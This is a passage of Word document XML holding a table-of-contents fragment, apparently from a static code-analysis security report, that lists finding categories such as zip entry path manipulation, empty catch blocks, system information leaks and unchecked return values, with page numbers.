          <w:hyperlink w:anchor="_Toc200039263" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.19.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Path Manipulation: Zip Entry Overwrite</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039263 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3072960D" w14:textId="42CDEA37" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039264" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.20.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Poor Error Handling: Empty Catch Block</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039264 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="36F33C7A" w14:textId="0099275A" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039265" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.21.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Poor Error Handling: Overly Broad Catch</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039265 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2C63E04D" w14:textId="6E7A28B9" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039266" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.22.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Poor Error Handling: Overly Broad Throws</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039266 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0EA0A47F" w14:textId="1C762CAD" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039267" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.23.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Poor Logging Practice: Use of a System Output Stream</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039267 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="43D34A4B" w14:textId="7E9A3186" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039268" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.24.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Poor Style: Confusing Naming</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039268 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1BD5F4E4" w14:textId="1F91666D" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039269" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.25.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Poor Style: Value Never Read</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039269 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7A2099E7" w14:textId="47455F1A" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039270" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.26.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Portability Flaw: Locale Dependent Comparison</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039270 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4FBD3345" w14:textId="10C6E2EC" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039271" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.27.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Privacy Violation</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039271 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2864BDC0" w14:textId="7781FB34" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039272" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.28.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Redundant Null Check</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039272 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3BD046DE" w14:textId="1B4D7B5B" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039273" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.29.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Resource Injection</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039273 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="403B7D81" w14:textId="1493BD9B" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039274" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.30.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>System Information Leak</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039274 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="454A82F2" w14:textId="796DF06D" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039275" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.31.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>System Information Leak: Internal</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039275 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="568E69E2" w14:textId="16ABEF71" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039276" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.32.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Unchecked Return Value</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
